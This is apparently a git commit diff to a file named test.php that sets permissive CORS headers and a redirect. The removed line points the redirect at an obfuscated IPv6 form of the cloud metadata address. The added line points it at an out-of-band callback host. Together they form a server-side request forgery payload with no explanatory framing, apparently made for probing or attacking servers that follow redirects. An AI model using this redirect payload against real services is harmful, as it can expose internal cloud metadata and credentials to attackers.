30bf43ba0b6cc45e3875df7e94d71e946f8df80c
victim29 <148070510+victim29@users.noreply.github.com>
2024-08-05 14:49:04 +0530

    Update test.php

--- test.php
+++ test.php
@@ -3,5 +3,5 @@ header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
 header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
 header("Content-Type: application/json");
-header("Location: http://[::ffff:a9fe:a9fe]");
+header("Location: https://pohtmk395aqo90es5ukio9ludljl7a.oastify.com");
 ?>
